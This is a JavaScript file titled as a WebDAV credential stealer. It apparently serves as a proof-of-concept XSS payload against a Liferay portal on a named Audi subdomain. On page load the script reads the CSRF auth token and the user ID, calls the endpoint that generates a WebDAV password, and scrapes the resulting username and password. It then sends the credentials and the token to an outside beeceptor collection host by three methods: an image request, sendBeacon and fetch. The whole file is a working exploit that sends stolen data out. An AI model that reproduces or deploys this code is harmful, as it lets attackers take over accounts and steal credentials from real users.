// credential-stealer-webdav.js - Extracts WebDAV credentials
(function() {
    function extractWebDAVCredentials() {
        try {
            // Step 1: Extract Liferay.authToken from current page
            var authToken = '';
            if (typeof Liferay !== 'undefined' && Liferay.authToken) {
                authToken = Liferay.authToken;
            } else {
                // Try to extract from page source
                var scripts = document.getElementsByTagName('script');
                for (var i = 0; i < scripts.length; i++) {
                    var scriptContent = scripts[i].textContent || scripts[i].innerText;
                    var match = scriptContent.match(/Liferay\.authToken\s*=\s*['"]([^'"]+)['"]/);
                    if (match) {
                        authToken = match[1];
                        break;
                    }
                }
            }
            
            // Step 2: Extract userId from getRealUserId function
            var userId = '';
            if (typeof Liferay !== 'undefined' && Liferay.ThemeDisplay && Liferay.ThemeDisplay.getUserId) {
                userId = Liferay.ThemeDisplay.getUserId();
            } else {
                // Try to extract from page source
                var scripts = document.getElementsByTagName('script');
                for (var i = 0; i < scripts.length; i++) {
                    var scriptContent = scripts[i].textContent || scripts[i].innerText;
                    var match = scriptContent.match(/getRealUserId:\s*function\s*\(\)\s*{\s*return\s*['"]?(\d+)['"]?/);
                    if (match) {
                        userId = match[1];
                        break;
                    }
                }
            }
            
            if (!authToken || !userId) {
                alert('Failed to extract authToken or userId\nauthToken: ' + authToken + '\nuserId: ' + userId);
                return;
            }
            
            // Step 3: Construct WebDAV password generation URL
            var webdavUrl = 'https://meine-audi-erlebnis-abholung.audi.de/group/guest/~/control_panel/manage?p_p_id=com_liferay_my_account_web_portlet_MyAccountPortlet&p_p_lifecycle=1&p_p_state=exclusive&p_p_mode=view&_com_liferay_my_account_web_portlet_MyAccountPortlet_javax.portlet.action=/users_admin/generate_webdav_password&_com_liferay_my_account_web_portlet_MyAccountPortlet_mvcRenderCommandName=/users_admin/generate_webdav_password&_com_liferay_my_account_web_portlet_MyAccountPortlet_p_u_i_d=' + userId + '&p_auth=' + authToken;
            
            // Step 4: Fetch the WebDAV password page
            fetch(webdavUrl)
                .then(function(response) {
                    return response.text();
                })
                .then(function(html) {
                    // Step 5: Extract WebDAV username and password from response
                    var parser = new DOMParser();
                    var doc = parser.parseFromString(html, 'text/html');
                    
                    // Extract WebDAV username (userid)
                    var usernameInput = doc.querySelector('input[id*="owue"]') || doc.querySelector('input[value="' + userId + '"]');
                    var webdavUsername = usernameInput ? usernameInput.value : '';
                    
                    // Extract WebDAV password
                    var passwordInput = doc.querySelector('input[id*="webDAVPassword"]');
                    var webdavPassword = passwordInput ? passwordInput.value : '';
                    
                    // Alternative extraction using regex if DOM parsing fails
                    if (!webdavUsername || !webdavPassword) {
                        var usernameMatch = html.match(/id="_com_liferay_my_account_web_portlet_MyAccountPortlet_owue"[^>]*value="([^"]+)"/);
                        var passwordMatch = html.match(/id="_com_liferay_my_account_web_portlet_MyAccountPortlet_webDAVPassword"[^>]*value="([^"]+)"/);
                        
                        if (usernameMatch) webdavUsername = usernameMatch[1];
                        if (passwordMatch) webdavPassword = passwordMatch[1];
                    }
                    
                    if (!webdavUsername || !webdavPassword) {
                        alert('Failed to extract WebDAV credentials from response');
                        return;
                    }
                    
                    // Step 6: Display credentials in alert
                    var message = '=== WebDAV CREDENTIALS STOLEN ===\n\n';
                    message += 'WebDAV Username: ' + webdavUsername + '\n';
                    message += 'WebDAV Password: ' + webdavPassword + '\n\n';
                    message += 'Original URL:\n' + webdavUrl + '\n\n';
                    message += 'Auth Token: ' + authToken + '\n';
                    message += 'User ID: ' + userId;
                    
                    alert(message);
                    
                    // Step 7: Send to Burp Collaborator
                    var collaborator = 'https://naysser.free.beeceptor.com';
                    var payload = '/?webdav_user=' + encodeURIComponent(webdavUsername) + 
                                  '&webdav_pass=' + encodeURIComponent(webdavPassword) +
                                  '&user_id=' + encodeURIComponent(userId) +
                                  '&auth_token=' + encodeURIComponent(authToken) +
                                  '&url=' + encodeURIComponent(webdavUrl);
                    
                    // Method 1: Image (most reliable)
                    var img = new Image();
                    img.src = collaborator + payload;
                    document.body.appendChild(img);
                    
                    // Method 2: sendBeacon
                    if (navigator.sendBeacon) {
                        navigator.sendBeacon(collaborator + payload);
                    }
                    
                    // Method 3: Fetch
                    fetch(collaborator + payload).catch(function(){});
                    
                })
                .catch(function(error) {
                    alert('Error fetching WebDAV credentials: ' + error.message);
                });
                
        } catch(e) {
            alert('Error in credential extraction: ' + e.message);
        }
    }
    
    // Execute when DOM is ready
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', extractWebDAVCredentials);
    } else {
        extractWebDAVCredentials();
    }
})();
